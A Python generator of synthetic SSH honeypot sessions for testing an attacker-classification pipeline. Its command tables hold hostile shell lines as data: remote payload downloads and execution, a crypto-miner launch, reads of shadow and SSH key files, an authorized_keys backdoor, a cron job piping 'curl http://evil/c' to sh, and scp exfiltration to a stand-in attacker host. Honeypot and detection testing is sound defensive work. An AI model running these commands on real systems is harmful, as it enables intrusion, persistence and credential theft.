"""Synthetic live-core ``session_document`` generator for development and tests.

Produces session documents in the **exact wire format** the Go core writes
(`network`/`timing`/`commands`/`auth_attempts`/`bait_interactions`), spanning the
four attacker archetypes, so the entire Phase-4 pipeline -- ingest → features →
weak labels → classifier → MITRE → summary → STIX -- is runnable and testable with
no live database. The archetypes are designed so the interpretable weak labeller
mostly recovers the intended class, giving the distilled classifier real signal;
they are *not* a claim about real-world base rates (which are overwhelmingly
automated). Swap in real documents from ``/api/sessions/{id}`` to validate.
"""

from __future__ import annotations

import base64
import random
from typing import Any

from .taxonomy import ATTACKER_CLASSES, AttackerClass

__all__ = ["make_session_document", "make_session_documents"]

_BASE_START_MS = 1_717_200_000_000  # arbitrary fixed epoch base (June 2024)

_AUTOMATED_BANNERS = (
    "SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-paramiko_2.7.2",
)
_HUMAN_BANNERS = (
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1", "SSH-2.0-OpenSSH_9.0",
)

_BRUTE_USERS = ("root", "admin", "ubuntu", "test", "oracle", "git")
_BRUTE_PASSWORDS = ("123456", "password", "root", "admin", "toor", "qwerty")

_SCANNER_CMDS = ("uname -a", "wget http://185.10.68.2/x", "chmod +x x", "./x")
_MINER_CMDS = (
    "nproc", "cat /proc/cpuinfo", "wget http://91.92.1.7/xmrig", "chmod +x xmrig",
    "./xmrig -o stratum+tcp://pool:3333 --donate-level 1", "pkill -9 minerd",
)
_DROPPER_CMDS = (
    "wget http://185.10.68.2/a", "curl -O http://185.10.68.2/b", "chmod +x a",
    "./a", "busybox wget http://185.10.68.2/c", "rm -rf a",
)
_RECON_CMDS = (
    "uname -a", "whoami", "id", "ls -la", "cat /etc/passwd", "ps aux",
    "netstat -an", "cat /proc/cpuinfo", "w", "cat /home/ubuntu/.bash_history",
)
_APT_RECON = ("uname -a", "id", "ls -la /home/ubuntu/.ssh", "cat /etc/passwd")
_APT_ACTIONS = (
    "cat /home/ubuntu/.ssh/id_rsa", "cat /etc/shadow", "cat /home/ubuntu/.env",
    "echo 'ssh-rsa AAAA attacker' >> /home/ubuntu/.ssh/authorized_keys",
    "crontab -l", "echo '* * * * * curl http://evil/c|sh' | crontab -",
    "history -c", "scp /home/ubuntu/.ssh/id_rsa attacker@evil:/tmp/",
)


def _b64(text: str) -> str:
    return base64.b64encode(text.encode("utf-8")).decode("ascii")


def _command(seq: int, ts_ms: int, delay: int | None, raw: str, cwd: str) -> dict[str, Any]:
    parts = raw.split()
    return {
        "event_id": f"cmd-{seq}-{ts_ms}",
        "sequence_number": seq,
        "timestamp_ms": ts_ms,
        "inter_command_delay_ms": delay,
        "raw_input_b64": _b64(raw),
        "parsed_command": parts[0] if parts else "",
        "parsed_args": parts[1:],
        "working_directory": cwd,
        "response_source": "hardcoded",
    }


def _build_commands(
    rng: random.Random, raws: list[str], start_ms: int, mean_ici: float, cv: float, cwds: list[str]
) -> tuple[list[dict[str, Any]], int]:
    """Build command dicts with log-normal inter-command timing."""
    import math

    sigma = math.sqrt(math.log(1.0 + cv * cv))
    mu = math.log(max(mean_ici, 1.0)) - 0.5 * sigma * sigma
    commands: list[dict[str, Any]] = []
    offset = float(rng.uniform(0, 800))
    for i, raw in enumerate(raws):
        delay = None if i == 0 else int(max(1.0, math.exp(rng.gauss(mu, sigma))))
        if delay is not None:
            offset += delay
        cwd = cwds[i % len(cwds)] if cwds else "/home/ubuntu"
        commands.append(_command(i, start_ms + int(offset), delay, raw, cwd))
    return commands, int(offset)


def _auth_attempts(rng: random.Random, start_ms: int, n: int, success_last: bool) -> list[dict[str, Any]]:
    attempts = []
    for i in range(n):
        attempts.append({
            "timestamp_ms": start_ms - (n - i) * 200,
            "method": "password",
            "username": rng.choice(_BRUTE_USERS),
            "credential": rng.choice(_BRUTE_PASSWORDS),
            "success": success_last and i == n - 1,
        })
    return attempts


def _bait(seq_event: str, ts_ms: int, bait_type: str, access: str, idx: int) -> dict[str, Any]:
    return {
        "event_id": f"bait-{idx}-{ts_ms}",
        "timestamp_ms": ts_ms,
        "bait_id": f"{bait_type}-decoy",
        "bait_type": bait_type,
        "access_type": access,
        "triggered_by_command_event_id": seq_event,
    }


def make_session_document(
    attacker_class: AttackerClass, rng: random.Random, index: int
) -> dict[str, Any]:
    """Generate one ``session_document`` for the given archetype."""
    start_ms = _BASE_START_MS + index * 3_600_000 + rng.randint(0, 60_000)
    client_ip = ".".join(str(rng.randint(1, 254)) for _ in range(4))
    server_port = rng.choice((22, 2222))

    if attacker_class == "automated_scanner":
        banner = rng.choice(_AUTOMATED_BANNERS)
        raws = list(_SCANNER_CMDS[: rng.randint(1, 4)])
        commands, dur = _build_commands(rng, raws, start_ms, mean_ici=25.0, cv=0.3, cwds=["/root"])
        auth = _auth_attempts(rng, start_ms, rng.randint(3, 8), success_last=True)
        bait: list[dict[str, Any]] = []

    elif attacker_class == "script_kiddie":
        banner = rng.choice(_HUMAN_BANNERS)
        pool = _MINER_CMDS if rng.random() < 0.5 else _DROPPER_CMDS
        raws = list(pool[: rng.randint(5, len(pool))])
        commands, dur = _build_commands(rng, raws, start_ms, mean_ici=600.0, cv=0.6, cwds=["/tmp", "/root"])
        auth = _auth_attempts(rng, start_ms, rng.randint(1, 3), success_last=True)
        bait = []

    elif attacker_class == "manual_recon":
        banner = rng.choice(_HUMAN_BANNERS)
        raws = rng.sample(_RECON_CMDS, k=rng.randint(5, len(_RECON_CMDS)))
        cwds = ["/home/ubuntu", "/home/ubuntu", "/etc", "/var/www"]
        commands, dur = _build_commands(rng, raws, start_ms, mean_ici=2500.0, cv=1.2, cwds=cwds)
        auth = _auth_attempts(rng, start_ms, rng.randint(1, 2), success_last=True)
        bait = []

    else:  # apt
        banner = rng.choice(_HUMAN_BANNERS)
        raws = list(_APT_RECON) + rng.sample(_APT_ACTIONS, k=rng.randint(3, len(_APT_ACTIONS)))
        cwds = ["/home/ubuntu", "/home/ubuntu/.ssh", "/etc", "/var/www"]
        commands, dur = _build_commands(rng, raws, start_ms, mean_ici=3000.0, cv=1.3, cwds=cwds)
        auth = _auth_attempts(rng, start_ms, rng.randint(1, 2), success_last=True)
        # Bait interactions: read a planted secret, then copy/exfil it.
        bait = []
        trigger = commands[len(_APT_RECON)]["event_id"] if len(commands) > len(_APT_RECON) else commands[-1]["event_id"]
        bt = rng.choice(("private_key", "shadow", "env_file"))
        bait.append(_bait(trigger, start_ms + dur - 2000, bt, "read", 0))
        bait.append(_bait(trigger, start_ms + dur - 1000, bt, rng.choice(("copy", "exfil_attempt")), 1))

    end_ms = start_ms + dur
    return {
        "session_id": f"sess-{attacker_class}-{index:05d}",
        "schema_version": "1.0",
        "node_id": "node-synthetic",
        "protocol": "ssh",
        "network": {
            "client_ip": client_ip,
            "client_port": rng.randint(1024, 65535),
            "server_port": server_port,
            "ssh_client_banner": banner,
        },
        "timing": {"start_ms": start_ms, "end_ms": end_ms, "duration_ms": dur},
        "outcome": rng.choice(("clean_disconnect", "timeout", "connection_reset")),
        "auth_attempts": auth,
        "commands": commands,
        "bait_interactions": bait,
        "intelligence": {
            "attacker_class": None, "classifier_confidence": None, "cluster_id": None,
            "mitre_techniques": [], "session_summary": None,
        },
    }


def make_session_documents(
    n: int = 400, seed: int = 0, class_mix: dict[AttackerClass, float] | None = None
) -> list[dict[str, Any]]:
    """Generate ``n`` session documents across the four archetypes.

    Args:
        n: Number of documents.
        seed: RNG seed.
        class_mix: Optional class → relative-weight mapping; defaults to balanced.

    Returns:
        A shuffled list of ``session_document`` dicts.
    """
    rng = random.Random(seed)
    if class_mix is None:
        class_mix = {c: 1.0 for c in ATTACKER_CLASSES}
    classes = list(class_mix)
    weights = [class_mix[c] for c in classes]

    docs: list[dict[str, Any]] = []
    for i in range(n):
        cls = rng.choices(classes, weights=weights, k=1)[0]
        docs.append(make_session_document(cls, rng, i))
    rng.shuffle(docs)
    return docs
